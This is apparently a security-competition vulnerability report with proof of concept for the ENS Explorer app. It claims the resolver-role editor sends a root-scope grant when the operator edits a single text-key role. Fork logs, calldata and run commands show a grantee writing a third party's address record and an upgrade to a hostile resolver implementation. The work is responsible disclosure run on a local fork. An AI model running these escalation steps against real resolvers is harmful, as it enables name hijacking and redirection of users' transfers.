**The executed crossing: `0x980ea45e…`.** Its affected beneficiary `0xa1618a47…` (`poc/E8-15_roleconn_sweep.log:321-332`) holds one role — `ROLE_SET_TEXT` on the text key `compliance.kyc` of `investora.namegate.eth`, a name it does not own. Title for the eight names the resolver serves is read **on chain at fork block 11658650** from the `namegate.eth` `UserRegistry` `0xbb8e69d0…` via `findOwner`/`findExpiry`/`getResolver` (`poc/E8-15_crossowner_title.log`, §1): six of the eight are live and served, of which **four belong to three owners who are neither the signer nor the grantee** (`investora` → `0xe07b6c41…`, `investorb`+`investorf` → `0x31faa2f6…`, `investorc` → `0x418e5e95…`), one is the signer's own (`investore`), one is burned; `investord` and `investorexpired` had expired (no owner, no resolver). So the figure this report uses — **four names under three third-party owners** — is a registry read, not an indexer read.

*(Two corrections this packet makes against its own earlier revision, stated rather than left to be found: (i) an earlier draft quoted the indexer's "eight names / six owners" as title — the indexer's `owner` field is expiry-blind and still named owners for the two expired labels; (ii) an earlier probe was on `investord`, which has no owner or resolver at the pin and established nothing — it is withdrawn. Neither touches the result: the name written, `investorb.namegate.eth`, is live, owned by `0x31faa2f6…`, and served by this resolver, all read on chain.)*

The Explorer's own pipeline over this resolver emits `grantRootRoles(1, 0xa1618a47…)`; sent on the fork by the real ROOT holder, the beneficiary then wrote the coin-60 address record of `investorb.namegate.eth` — a third party's name — while the correctly scoped call from the same snapshot leaves it refused (`poc/E8-15_crossowner_consequence.log`, `poc/E8-15_crossowner_title.log`, branch A vs B).

On the other two multi-owner resolvers the extra reach is conditional (on `0x13214572…` a root grant adds only the signer's own `rugradar.eth`; on `0xeb22a41c…` it depends which of two ROOT holders signs). On the remaining seven, single-owner, the grant merely widens without crossing a line. **The defect is identical on all ten; only whose property the surplus authority reaches changes.**

### Why it is not rare by construction

The unresolvable case is not an anomaly to be seeded. Any role granted with `part ≠ 0` — one text key, one coin type — is unresolvable, always, because `computeNameResource` has the `part` hardcoded to zero. The precondition for the **root branch** is one step narrower and worth stating exactly: `roleName` is `''`, and the edit is signed at root scope, when the account holds **no separately resolvable name-scoped role on that resolver**. An account that also holds a plain name-scoped row does show a name and is scoped to it — that happened once in 29 groups, and is the sweep's positive control. A ROOT row does **not** rescue the row, because the `find` skips `'(root)'` explicitly.

So: every fine-grained role is invisible to the app, always; and every fine-grained role whose holder has no name-scoped row on that resolver is in the affected state today. That was 16 of the 29 groups examined, and any created tomorrow will be too.

### The ceiling: the same one checkbox replaces the resolver's code

Everything above concerns `ROLE_SET_ADDR`, because that is the row the demonstration edits. But the scope defect does not depend on which permission is ticked — **any** ticked box on an unresolvable row is emitted at root scope — and one of the permissions the Explorer offers on that row is **Upgrade**.

`resolverRoles.ts:104-107` lists `ROLE_UPGRADE` in the sidebar's permission list, titled *"Upgrade — Can upgrade the resolver contract"*. Tick it on a text-key-scoped row, and the same four hops emit `grantRootRoles(1 << 124, account)` — the identical `0x072d5d77` calldata, carrying `ROLE_UPGRADE` instead of `ROLE_SET_ADDR`. And the deployed resolver gates its UUPS upgrade on exactly that role and nothing else:

```solidity
// PermissionedResolver.sol:747-752 (Etherscan-verified deployed source)
function _authorizeUpgrade(address newImplementation)
    internal override onlyRootRoles(PermissionedResolverLib.ROLE_UPGRADE) { }
```

an empty body behind one role check; `canUpgradeFrom` (`:630-640`) returns `true` unconditionally. So an account holding root `ROLE_UPGRADE` can replace the resolver's implementation outright.

**This is executed** (`poc/E8-15_upgrade_ceiling.sh`, `.log`; the hostile implementation is `poc/E8-15_upgrade_ceiling.sol`). On the fork, the beneficiary `0xa1618a47…` — whose only real authority was one text key on one name it does not own — is granted root `ROLE_UPGRADE` by the app's own calldata, deploys a hostile implementation, and calls `upgradeToAndCall`:

```
BEFORE  implementation slot          0x…9eae5c2730…   (the real PermissionedResolver)
        addr(investorb.namegate.eth) 0x0
        hasRootRoles(ROLE_UPGRADE, BEN)  false
1.      grantRootRoles(1<<124, BEN)  status 0x1   -> hasRootRoles(ROLE_UPGRADE, BEN) now true
2.      attacker deploys hostile impl; proxiableUUID and canUpgradeFrom both satisfied
3.      BEN: upgradeToAndCall(hostile, 0x)  status 0x1
AFTER   implementation slot          0x…8bbc3514…    (the attacker's code)
        addr(investorb.namegate.eth) 0x…DeadBeef
        addr(any random node)        0x…DeadBeef     <- EVERY name, not one record
        pwned()                      "ENS-007: resolver code replaced via one over-granted checkbox"
```

After the upgrade **every** name the resolver serves — not one record on one name — resolves to an attacker-controlled address, permanently, and the resolver runs arbitrary attacker code. This is the programme's Critical row `:789` on its own terms: *"a registration or migration that assigns the name, its ownership, registry, or **resolver** to an attacker"* — here the resolver's code itself.

**One honesty note, stated rather than buried.** This ceiling requires the operator to tick the **Upgrade** permission specifically; the ordinary runs tick **Set Address**. The Explorer offers both in the same list, on the same blank-scoped row, and routes both through the same empty display string to root scope — so the defect is identical and the escalation is the same one. What differs is only which permission the operator believed they were delegating at one-record scope. The report's lead claim does not rest on this section; it is the demonstrated ceiling of the same one-line defect, and it is put here so the impact is not mistaken for a single record write.

### Which impact row this is

**The row claimed is the Critical row for already-connected wallets**, in the programme's own words:

> *"Malicious interactions with an already-connected wallet, such as: Modifying transaction arguments or parameters · Substituting contract addresses · Submitting malicious transactions · Signing or submitting a transaction against the wrong chain (for example when the request's target chain is not validated) · **Inducing a blanket token approval (for example**\*\* ****`setApprovalForAll`**** \*\***on the registry or NameWrapper) to an attacker-controlled address**"*

**The row's last example is the closest thing on this ladder to what happens here, so it is quoted in full rather than trailed off.** `grantRootRoles` is this resolver's `setApprovalForAll`: `authorizeNameRoles` authorises one name the way `approve(tokenId)` authorises one token, and `grantRootRoles` authorises all of them at once — `EnhancedAccessControl.sol:452-455` ORs root roles into every resource, so there is no narrowing left after it. The row treats *a blanket authorisation signed where a scoped one was intended* as Critical. That is this defect in one line: the operator edits a row scoped to one record and the wallet is handed the blanket.

The interaction is with an already-connected wallet: `grantResolverRoles.ts:29-75` takes the connected `walletClient` (`:24`), builds the write parameters at `:45-61`, encodes at `:63-67`, and returns an intent whose `from` is `walletClient.account.address` and whose `to` is the resolver (`:69-74`) for that wallet to sign. What the wallet is asked to sign is `grantRootRoles(1, account)` — selector `0x072d5d77`, 68 bytes — where the scope of the row the operator edited requires a resource-scoped call. The function selector differs and the whole argument set differs, and the difference is computed by the application from its own state, not typed by the user. **That is a modified transaction argument in the row's own words**, and both calldatas are attached.

**The word "Malicious", met head-on.** The row's own named examples settle it. One of them — *"Signing or submitting a transaction against the wrong chain (for example when the request's target chain is not validated)"* — is an application validation failure on its face: what it names as the defect is the application's omission, not an actor's act. Read to require an adversary who manufactures the input, that example falls outside its own row. And the row names an attacker expressly where it wants one, one clause later — *"to an attacker-controlled address"* — so the absence of that word from the other examples is a choice, not an oversight. Here the substitution **is** the interaction with the connected wallet: consent is taken for one call, and a different call is presented for signature.

The programme's *Prioritized vulnerabilities* block reads the same failure the same way — *"anything that lets a transaction be built, signed, or attributed with the wrong chain, sender, target address, or **arguments**"* — a property of the transaction, with no adversary in it. That sentence is written about `packages/transaction-manager` and `packages/smart-account`, so it is cited for how the programme reads the failure, not as a claim that this defect sits in those packages. It does not; it sits in `apps/portal`, a declared asset in its own right.

**And the substitution is invisible on the screen that asks for consent.** The two branches of the render control differ in the function called and in every argument — `grantRootRoles(1, account)` against `authorizeNameRoles(dnsEncode(name), 1, account, true)`, 68 bytes against 196 — while the confirmation screen shows the **same two strings in both**: *"Save resolver role changes"* and *"Update roles for 0x49d037a6…"* (`poc/E8-15_render_screen.log`; `poc/screens/4-confirmation-before-signing.png`). The row's words are *"modifying transaction arguments or parameters"*; here the arguments differ entirely and the interface presents them identically.

**The baseline is inside the unpatched run.** The application holds the row's real resource at the moment it builds the call — it selects every role's `resource` from the indexer (`useResolverOverview.ts:16,92`), and `poc/E8-15_app_pipeline.log` section A prints the live row as `resource=0x387d89ea…` before any transformation of this report's making. The call it then hands the wallet reaches resource `0x0000…0000`. Input and output sit in one unpatched run and they differ: the parameter that decides the transaction's reach is discarded between the two. Branch B is corroboration that a correctly scoped call exists and is expressible by the app's own dependency.

**Who benefits, and what that account has to do.** The record keys the 33 flagged rows are scoped to, straight from the sweep, are the nineteen below — 31 of the 33 rows are text-scoped, and the other 2 are addr-scoped to coin type 60 with no record key at all (`poc/E8-15_roleconn_sweep.log`; a triager reproduces the set with `grep -o "recordKey=[^ ]*"`):

```
x402:price          x402.pricing        agent-endpoint[web]   agent.status
agent.heartbeat     agent.output.last   agent:volume          agent:capabilities
agent:disputes      agent:endpoint      agent:price           agent:score
agent_session       leash.status        leash.cap             leash.allow
compliance.kyc      description         url
```

Those keys are measured. What they suggest about the relationships behind them — an operator delegating one record to an agent, a pricing service or a compliance checker — is an inference from the key names, and is offered as one. What is measured is the shape of the grant: it is the narrowest the protocol offers, and the account holding it need do nothing whatever to be widened to the whole resolver. It waits for the operator to adjust its permissions once. No exploit, no injection, no social engineering — the interface does the escalating.

### What the escalated authority is, and the further Critical rows it reaches

The role the grant confers is `ROLE_SET_ADDR` at ROOT scope. By `EnhancedAccessControl.sol:452-455` that is the authority to set **the address record of every name the resolver serves** — measured on the fork over four names at once and exercised on one (`poc/E8-15_crossowner_title.log`, branch A).

That record is not inert. It is the value the Explorer's own resolution path returns, and the app's transfer and add-user flows send to wherever it points — each hop one line in `apps/portal`: `routes/$name/ownership/transfer.tsx:196` mounts `SendNameForm`; `SendNameForm.tsx:81-82` resolves the typed recipient via `useAddressResolution`; that reaches `resolveAddressOrName` (`useAddressResolution.ts:6,61` → `getResolvedAddress.ts:6,26` → `roles/helpers/addUser.handlers.ts:20-23`, `getEnsAddress` — the **addr record**, with the ENS owner only a fallback for names that set none, `:27-34`); `SendNameForm.tsx:253-285` (`RecipientPreview`) renders that address in full; and `:106-109` transfers the name to it. The same `useAddressResolution` hook is reused by `ResolverAddUserSheet`, `RolesAddUserSheet`, `RegistryAddUserSheet` and `create-subname.tsx`.

**This is the pre-fill Critical row `:786`, matched verbatim and executed.** The row — *"Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user … submits a transaction **to an unintended recipient**, such as: · **resolving or rendering an ENS name to an attacker-controlled address** …"* — carries no app or flow restriction, and all its limbs are met: `poc/E8-15_transfer_resolution.log` mounts the **unmodified** `SendNameForm` against a fork on which the grantee has written `investorb.namegate.eth`'s record, types that name as the recipient, and the app resolves it to the attacker's address, displays it under its own warning *"Make sure you check the recipient address before proceeding"*, and enables **Transfer** (`poc/screens/6b-transfer-recipient-resolved.png`). Nothing in the resolution is stubbed; mounting the form directly skips only the ownership gate (`transfer.tsx:102-104`), which decides *who may open the form*, not who it resolves to. *(The Manager-flow row `:789` names the same "redirecting the recipient of a name transfer" but is scoped to a "Manager flow" while this surface is the Explorer, so `:786` is pleaded instead — the mechanism is identical.)*

**In the further alternative — the third-party-action row `:792`** (*"Taking state-modifying authenticated actions … on behalf of other users without any interaction by that user … Changing registration information"*): after the grant, the over-privileged account wrote the address record of `investorb.namegate.eth`, whose owner took no part in any step — executed (`poc/E8-15_crossowner_title.log`, branch A).

**What is executed, and the one step that is not.** Executed: the over-grant from the app's own modules; the write of a third party's record, title read on chain at the pin; the Explorer displaying that address; and the transfer form resolving a recipient to it and enabling Transfer. **Not executed:** the transfer broadcast itself — no wallet is connected in the harness. The last step is `SendNameForm.tsx:106-109`, one cited line. No claim is made that any user sent anything; none did. (One disclosed mitigation: on `/$name/address` the *Reverse match* column shows red *"False"* for the poisoned record, `useReverseMatch.ts:234-241` — a partial check on that one view, absent from the transfer surface which shows only the full resolved address, `SendNameForm.tsx:276-281`.)

**Severity: Critical, with no sub-Critical landing zone.** Every graded row below Critical that could otherwise describe affecting another user is expressly conditioned on the **absence** of already-connected-wallet interaction — `:798` (High, subdomain takeover *without*), `:807` (High, changing sensitive details *without*), `:821` (Medium, non-sensitive *without*), `:824` (Low, *without*, iframing) — the exact mechanism present here. The remaining rows are content injection (`:801`, `:816`), disclosure (`:810`), open redirect (`:813`), DoS (`:828`) and broken links (`:833`), none of which occurs; and Insight is four recommendation categories (`:837`, `:840`, `:843`, `:846`), which a demonstrated on-chain escalation is not. The programme placed already-connected-wallet interactions at Critical and nowhere else, so the outcome is Critical or Insight, with nothing between.

**And the impact is not one record.** The floor is a cross-owner record write; the ceiling (see *The ceiling*, above) is the same one checkbox emitting root `ROLE_UPGRADE`, the resolver's implementation replaced, and every name it serves resolving to the attacker permanently — Critical row `:789` (*"assigns … the resolver to an attacker"*). Both are executed on a fork.

### On the age of the affected population, met head-on

Every one of the ten affected resolvers was deployed between 2026-08-30 and 2026-09-05 (`poc/E8-15_provenance.log`), which is inside this competition's window. That is stated here rather than left for a triager to notice, because the inference it invites — *"this is competition noise"* — is worth answering directly.

**The defect does not depend on the population, and would be identical with zero rows on chain.** `computeNameResource` hardcodes `part` to zero, so *every* text-scoped and *every* addr-scoped role is unresolvable — always, by construction, for two of the protocol's four scopes. The census is corroboration that the state occurs in practice and is not a contrivance of this report; it is not the claim.

**And the code is not competition scaffolding — it is upstream.** The audited repository has three commits, the first of which is `cda79ac fork ensdomains/apps-monorepo at 63772fd872af472ced58b0094 99355f3430c2a86`; the other two are a Dependabot bump of `hono` and its merge. `git log -- apps/portal/src/lib/roles/resolverRoles.ts` returns **the fork commit and nothing else**, so the file is byte-identical to `ensdomains/apps-monorepo@63772fd8`. The same is true of `grantResolverRoles.ts` and `revokeResolverRoles.ts`. Whatever is decided about the rows on Sepolia, the defect is in ENS's own production monorepo and the fix lands there.

**Nor is a young population surprising here — and the network is the programme's own choice.** The Explorer at this commit targets exactly one chain, Sepolia (`wagmi.ts:67`), against a staging indexer (`packages/indexer/urql/client.ts:28,36`). That is not a limitation of this report's reach; it is the asset's declared environment: *"**Ethereum Sepolia is the primary network.** Resolution and primary-name flows also read and write the Sepolia testnets of Optimism, Arbitrum, Base, Linea and Scroll"* (`Project_Details.txt:107`). Every finding against this asset lives there, including one filed on day one. No mainnet measurement was attempted and none is claimed. And fine-grained roles cannot be created in this app at all: the Add-User sheet's name field is a selection-only combobox over the resolver's own nodes (`ResolverAddUserSheet.tsx:186,256-285`), so they are created by `ensjs` or by direct calls, which is precisely what an integrator exercising a new deployment does. The ten affected resolvers were deployed by **eight distinct EOAs** over 5.9 days (`poc/E8-15_provenance.log`), none of them this researcher, and this work sent no transaction on any public chain. (Who sent each individual role grant was measured only for the resolver used in the demonstration, where all four rows came from one sender; it is not asserted for the other nine.)

## References

All sites are under `apps/portal` (declared asset "Explorer app Files") unless noted. `@ensdomains/ensjs` and the deployed `PermissionedResolver` are cited as sink and authority model; no defect is claimed in either.

**The defect** — `lib/roles/resolverRoles.ts:138-141` (`computeNameResource`, `part` hardcoded to `ZERO_BYTES32`; JSDoc `:134-137`), `:147-160` (`buildResourceToNameMap`, part-0 only), `:179-221` (`groupRolesByAccount`, no name on a miss); `ResolverRolesSidebar.tsx:169` (`roleName … ?? ''`); `grantResolverRoles.ts:47-60` and `revokeResolverRoles.ts:47-60` (the scope ternary); `:20` (the JSDoc defining `''` as ROOT\_RESOURCE / all names); `rolesToPermissions.ts:11,66`.

**Never the signer** — `ResolverRolesSidebar.tsx:353-359` (`canEdit = canManageRoles && !isSelf`).

**What is not shown** — `ResolverRolesTable.tsx:68-70` (blank Name cell); `ResolverRolesSidebar.tsx:391,393,395` (scope sentence suppressed), `:339-349` (the two confirmation strings, neither carrying a scope); `TransactionInfoContent.tsx:35,42-44` (where they render); `grantResolverRoles.ts:111` (the only `(root)` string, built after confirm and rendered by nothing).

**The impact surface** — `routes/$name/ownership/transfer.tsx:196`; `SendNameForm.tsx:81-82,106-109,253-285,276-281`; `useAddressResolution.ts:6,61` → `getResolvedAddress.ts:6,26` → `roles/helpers/addUser.handlers.ts:20-23,27-34` (`getEnsAddress`, owner only a fallback). Reverse-match on `/$name/address`: `AddressResolution/columns.tsx:22-41`, `useReverseMatch.ts:234-241`.

**The fix the app already has** — `packages/indexer/graphql.gen.ts:927` (`namedResources`, the only occurrence); `useResolverOverview.ts:66-108` (the query that omits it; `:97` the null `name` field); `@ensdomains/ensjs/…/utils/v2/roles/resolverResource.ts:15,28,40` (`computeResolverResource`/`textPart`/`addrPart`, never imported).

**The sink** — `@ensdomains/ensjs/…/actions/wallet/v2/grantResolverRoles.ts:115-157` (four-arm `switch (params.scope)`, docstring defining `'root'` as *"any name, any record type"*); `…/actions/public/v2/hasRoles.ts:137-180`.

**The authority model** (Etherscan-verified deployed impl `0x9eae5c2730…`; the audited repo has no `.sol`) — `PermissionedResolverLib.sol:71-80` (`resource(node, part) = keccak256(node ‖ part)`, `0` when both zero = ROOT\_RESOURCE), `:85-97` (`partHash`), `:7-64` (twelve non-admin roles; `:57` `ROLE_CAN_NAME = 1 << 120`, omitted by the in-repo SDK); `PermissionedResolver.sol:273-294` (`authorizeNameRoles`, emits `NamedResource` `:287`), `:303-327` (`authorizeTextRoles`, four params / no bitmap, emits `NamedTextResource` `:320`), `:336-341` (`authorizeDataRoles`), `:369` (`authorizeAddrRoles`), `:178-187` (`onlyPartRoles`, also honours `resource(0, part)`), `:630-640` (`canUpgradeFrom` → true), `:747-752` (`_authorizeUpgrade`, empty body, `onlyRootRoles(ROLE_UPGRADE)`); `EnhancedAccessControl.sol:54,452-455` (`ROOT_RESOURCE = 0`; `_effectiveRoles` ORs root into every resource). The scope model is measured (`poc/E8-15_scope_model.log`) and confirmed by the contract's revert data.

**How every resolver here gets its admin bits** — `permissionedResolver.ts:21-23,42-43` (`initialize(owner, 0x1111…1111, [])`); `permissionedResolverAddress.ts:11,38` (Manager path); `registration-calls.ts:241` (smart-account path, validator-enforced).

**Environment** — `wagmi.ts:67` (`chains: [sepoliaWithEns]`, single chain, no override); `packages/indexer/urql/client.ts:36` (default `https://staging-graphql.ens.dev/`).

## Link to Proof of Concept

<https://gist.github.com/drMurlly/eea07fd3c13eb3e72d89e2b068a1a2b4>

## Proof of Concept

## Proof of Concept

**Nine runs**, in order of what they establish, then two measurements (§8 the population, §9 where a root grant crosses an ownership line). All are attached with their producers.

*A note on labels, because the Bug Description and this field are read in sequence.* The Description calls them by resolver, not by number: its **cross-owner demonstration** on `0x980ea45e…` is runs 4 and 4b here; its **isolation control** on `0x34b1699b…` is runs 1 and 2 here.

| #  | run                                                     | what it establishes                                                                                                                                                                                                                                                                                | attached                                                                                                                                                   |
| -- | ------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 1  | **the application's own pipeline**                      | live indexer data → the app's own functions → `grantRootRoles` calldata. No value in this run is hand-written; the scope is produced by the app's own ternary.                                                                                                                                     | `poc/E8-15_app_pipeline.ts` · `.log`                                                                                                                       |
| 2  | **the on-chain consequence**                            | that calldata, sent on a local fork, gives the grantee write access to a name it holds no role for — with the correct calldata as an A/B control from the same base state                                                                                                                          | `poc/E8-15_fork_consequence.sh` · `.log`                                                                                                                   |
| 3  | **the four-scope model**                                | the deployed contract really does implement four scopes, and only one of them is expressible by the app                                                                                                                                                                                            | `poc/E8-15_scope_model.sh` · `.log`                                                                                                                        |
| 3b | **the severity ceiling — total resolver takeover**      | the same one-checkbox flow, ticking *Upgrade* instead of *Set Address*, emits root `ROLE_UPGRADE`; the over-granted account then replaces the resolver's implementation and **every** name it serves resolves to the attacker                                                                      | `poc/E8-15_upgrade_ceiling.sol` · `.sh` · `.log`                                                                                                           |
| 4  | **the same defect, across an ownership line**           | runs 1 and 2 again, unmodified, on a resolver that serves other people's names: the grantee ends up writing a record on a name owned by a **third party** — neither the signer nor the grantee                                                                                                     | `poc/E8-15_crossowner_pipeline.ts` · `.log` · `poc/E8-15_crossowner_consequence.sh` · `.log`                                                               |
| 4b | **and the title is read on chain, not off the indexer** | run 4 again with every owner established by `findOwner` / `findExpiry` / `getResolver` against the registry at the pinned block, probing only names proved live, served by this resolver and owned by a third party. Four such names under three owners; the write lands on one of them            | `poc/E8-15_crossowner_title.sh` · `.log`                                                                                                                   |
| 7  | **what the app then DOES with that record**             | the application's own `SendNameForm` — the transfer form — is given the poisoned name as a recipient. It resolves it to the address the grantee wrote, displays that as the recipient, and enables *Transfer name*                                                                                 | `poc/E8-15_transfer_entry.tsx` · `E8-15_transfer.html` · `E8-15_transfer_resolution.mjs` · `.log` · `poc/screens/6b-transfer-recipient-resolved.png`       |
| 6  | **the record, rendered by the app itself**              | the fork left in the post-grant state, and the audited Explorer pointed at it: its own Address Resolution page for `investorb.namegate.eth` displays the address the over-privileged grantee wrote                                                                                                 | `poc/E8-15_poison_for_render.sh` · `poc/E8-15_render_resolution.mjs` · `.log` · `poc/screens/5-explorer-renders-the-poisoned-record.png`                   |
| 5  | **the screen the operator actually sees**               | the app's own React components, rendered — first in the repository's own test runner, then in a real browser with the app's own stylesheet. The Name cell is empty, the scope sentence is absent, and the confirmation screen names no scope; the calldata behind it is the same 68 bytes as run 1 | `poc/E8-15_render_screen.test.tsx` · `.log` · `poc/E8-15_screen_entry.tsx` · `E8-15_screen.html` · `E8-15_screen_shots.mjs` · `.log` · `poc/screens/*.png` |

Runs 2, 3 and 4 use a **local anvil fork** at a pinned block. Run 5 touches no network at all. Nothing was sent to any public network and no key on Sepolia is held by this researcher.

**Every run is against an unmodified checkout.** `git status --porcelain` in the audited repository at the pin reports only the untracked PoC files this packet ships and **no modification to any tracked file** — printed at the head of `poc/E8-15_render_screen.log`.

***

### 1. The application's own pipeline, end to end

`poc/E8-15_app_pipeline.ts` imports the application's functions unmodified and runs them over live data from the indexer the app is configured for. It is dropped into `apps/portal/src/`, bundled and run:

```bash
cd apps/portal
cp <packet>/poc/E8-15_app_pipeline.ts src/
../../node_modules/.pnpm/@esbuild+linux-x64@0.28.1/node_modules/@esbuild/linux-x64/bin/esbuild \
    src/E8-15_app_pipeline.ts --bundle --format=cjs --platform=node --target=node18 \
    --outfile=E8-15_app_pipeline.cjs
node E8-15_app_pipeline.cjs
```

Every transformation is the app's:

```
buildResourceToNameMap            lib/roles/resolverRoles.ts:147-160
groupRolesByAccount               lib/roles/resolverRoles.ts:179-221
roleToPermissions                 lib/roles/rolesToPermissions.ts:11
computeRoleChanges                lib/roles/rolesToPermissions.ts:66
prepareGrantResolverRolesTransaction   features/resolver/helpers/grantResolverRoles.ts:29
prepareRevokeResolverRolesTransaction  features/resolver/helpers/revokeResolverRoles.ts:29
```

and the one expression that is not an exported function is quoted inline from `ResolverRolesSidebar.tsx:169`:

```ts
const roleName = g.resolvedNames.find((n) => n !== '(root)') ?? ''
```

**The only value this file passes for `name` is that `roleName`.** It writes no `scope` anywhere; `scope` is produced by the ternary at `grantResolverRoles.ts:47-60`.

Output (`poc/E8-15_app_pipeline.log`, run 2026-09-07). Section A, straight from the indexer:

```
resolver            0x34b1699ba597020111510ba53ea2389924c28dbc
nodes               acmestudio.sideloadtest26.eth, sideloadtest26.eth
  account=0x49d037a6…  resource=0x387d89ea…  bitmap=0x…010  name=null
  account=0x824db7d3…  resource=0x95f0b269…  bitmap=0x…010  name=null
  account=0x1fc343e8…  resource=0xefdf2213…  bitmap=0x…010  name=null
  account=0x9940798a…  resource=0x00000000…  bitmap=0x11000…  name=null

per-role `name` is null on 4 of 4 rows — the field the app already selects cannot supply the scope.
```

Section B recomputes the resource for each `part` and matches three of them against those live rows; the part-0 value the app *can* compute matches none of them:

```
part = 0                        -> 0x5c0b53d5…   <- ALL the app can compute
part = keccak256("description") -> 0xefdf2213…   <- MATCHES a live role row
part = keccak256("url")         -> 0x95f0b269…   <- MATCHES a live role row
part = keccak256("agent_session")-> 0x387d89ea…  <- MATCHES a live role row

part-0 resource present in the live role set? false
```

Sections C and D run the app's map and grouping, and evaluate the sidebar's expression:

```
map size 3 (ROOT + one part-0 entry per node)
role rows whose resource the map cannot name: 3 of 4

account=0x49d037a6…  resolvedNames=[]  decodedRoles=["ROLE_SET_TEXT"]
  roleName=""  -> the ternary at grantResolverRoles.ts:47 will read scope='root'
```

Note the fourth row: the ROOT holder `0x9940798a…` has `resolvedNames=["(root)"]` and **also** gets `roleName=""`, because the `find` skips `'(root)'` explicitly. A ROOT row does not rescue a group.

Section E ticks one permission through the app's own change computation, and section F is the hinge:

```
roleToPermissions(decodedRoles) = [["ROLE_SET_TEXT",{"admin":false,"manager":true}]]
computeRoleChanges -> rolesToGrant=["ROLE_SET_ADDR"] rolesToRevoke=[]

intent.to        0x34b1699ba597020111510ba53ea2389924c28dbc
calldata         0x072d5d77…000149d037a6943eb6a1eef98c443beaf1f37402ce2d
calldata bytes   68
selector         0x072d5d77
function         grantRootRoles
args             ["1","0x49D037a6943eB6a1eEf98c443BEAf1f37402Ce2d"]
```

Section G is the control. **Same functions, same account, same ticked role**; the only change is that the resource map also carries the text-scoped resource, which is what selecting `namedResources` would give the app:

```
resolvedNames=["acmestudio.sideloadtest26.eth"]
roleName="acmestudio.sideloadtest26.eth"  -> scope='name'
function         authorizeNameRoles
args             ["0x0a61636d6573747564696f…","1","0x49D037a6…",true]

DIFFERENT FUNCTION? true   (grantRootRoles vs authorizeNameRoles)
```

Section H runs the revoke direction through the app's own helper: *"Remove user from all roles"* on the same row emits `revokeRootRoles(16, …)` — selector `0xce156e82` — which clears the ROOT resource, not the text-scoped resource the row actually holds.

***

### 2. The on-chain consequence, with an A/B control

`poc/E8-15_fork_consequence.sh` takes the two calldatas produced above — **verbatim, not re-encoded** — and sends each from the resolver's real ROOT-role holder on a local fork. Both branches start from one base state, isolated with `evm_snapshot`/`evm_revert`.

```bash
anvil --fork-url <SEPOLIA_RPC> --fork-block-number 11654843 --port 8560 --silent &
RPC=http://127.0.0.1:8560 bash E8-15_fork_consequence.sh
```

Output — **condensed** from `poc/E8-15_fork_consequence.log` (fork block 11654843): resource hashes and tx hashes are elided to their first four bytes, and the log's four separate `calldata` / `bytes` / `selector` / `args` lines are folded into one. Every value below appears in that log; the log itself is the verbatim record.

```
1. BASE STATE
hasRootRoles(ROLE_SET_ADDR, beneficiary)     : false
beneficiary setAddr on acmestudio.…(its own) : REVERT  (EAC error 0x4b27a133, resource checked 0x5c0b53d5…)
beneficiary setAddr on sideloadtest26.eth    : REVERT  (EAC error 0x4b27a133, resource checked 0xc9233259…)
addr(sideloadtest26.eth, 60)                 : 0x

2. BRANCH A — the calldata the application actually emits
selector   0x072d5d77  = grantRootRoles(uint256,address)   68 bytes
status 0x1   gasUsed 62740
hasRootRoles(ROLE_SET_ADDR, beneficiary)     : true
beneficiary setAddr on sideloadtest26.eth    : OK   <-- WAS REVERT
  addr(sideloadtest26.eth, 60) now : 0x00000000000000000000000000000000deadbeef

3. BRANCH B (CONTROL) — the calldata the same app code emits when the resource resolves
selector   0xbbd9abb5  = authorizeNameRoles(bytes,uint256,address,bool)   196 bytes
status 0x1
hasRootRoles(ROLE_SET_ADDR, beneficiary)     : false
beneficiary setAddr on acmestudio.…(its own) : OK        <-- the intended grant lands
beneficiary setAddr on sideloadtest26.eth    : REVERT     <-- still refused
```

The edited row's on-chain role is `ROLE_SET_TEXT` on **one text key** of `acmestudio.sideloadtest26.eth`. After branch A the grantee writes the **coin-60 address of a different name** on the same resolver. After branch B — the identical edit, correctly scoped — it cannot.

The fork-consequence log's own section 4 measures the **revoke** direction from the same base state:

```
4. THE REVOKE DIRECTION — 'Remove user from all roles' under-revokes
BEFORE  grantee setText(acmestudio…, 'agent_session') : ALLOWED
sent    revokeRootRoles(16, grantee)   status 0x1
AFTER   grantee setText(acmestudio…, 'agent_session') : ALLOWED
```

The transaction succeeds and the interface reports the removal. The grant it was presented as removing is untouched, because `revokeRootRoles` clears the ROOT resource and this role does not sit on it.

One incidental result worth stating, because it checks the resource formula against the chain rather than against the source: the base-state revert is a custom error whose first word is `0xc9233259f2400d679f2fdf604fc591373141b5f6b11acdaec27130611b36377e`, and the script computes `keccak256(namehash('sideloadtest26.eth') ‖ bytes32(0))` to exactly that value. **The deployed contract confirms `resource = keccak256(node ‖ part)` from its own error.**

***

### 3. The four scopes, executed

`poc/E8-15_scope_model.sh` grants each fine-grained scope in turn from the same base state and prints the resulting permission matrix. This replaces an earlier revision's argument-from-source about what `partHash` does.

```bash
anvil --fork-url <SEPOLIA_RPC> --fork-block-number 11654682 --port 8558 --silent &
RPC=http://127.0.0.1:8558 bash E8-15_scope_model.sh
```

Output (`poc/E8-15_scope_model.log`, fork block 11654682), one column per grant:

```
                                          BASE   +addr60  +text'description'  +name  +root
setAddr(acmestudio…, coin 60)             DENIED  ALLOWED   DENIED            ALLOWED ALLOWED
setAddr(acmestudio…, coin 0)              DENIED  DENIED    DENIED            ALLOWED ALLOWED
setText(acmestudio…, 'description')       DENIED  DENIED    ALLOWED           ALLOWED ALLOWED
setText(acmestudio…, 'url')               DENIED  DENIED    DENIED            ALLOWED ALLOWED
setAddr(sideloadtest26.eth, coin 60)      DENIED  DENIED    DENIED            DENIED  ALLOWED
```

Read down the columns: an addr-coin-type grant reaches **one coin type of one name**; a text-key grant reaches **one key of one name**; a name grant reaches **one whole name**; a root grant reaches **every name on the resolver**. `computeNameResource` (`resolverRoles.ts:138-141`) can express only the name column — and when it fails, the app does not fall back to that column, it falls back to the last one.

***

### 3b. The severity ceiling — one over-granted checkbox replaces the resolver's code

Section 3 measured the four scopes on `ROLE_SET_ADDR`. The scope defect is indifferent to which permission is ticked, and the Explorer offers **Upgrade** on the same row. Ticked on an unresolvable row, it emits `grantRootRoles(1 << 124, account)` — the same `0x072d5d77` shape carrying `ROLE_UPGRADE` — and the deployed resolver gates its UUPS upgrade on exactly that role (`PermissionedResolver.sol:747-752`, an empty `_authorizeUpgrade` body behind `onlyRootRoles(ROLE_UPGRADE)`; `canUpgradeFrom` at `:630-640` returns `true`).

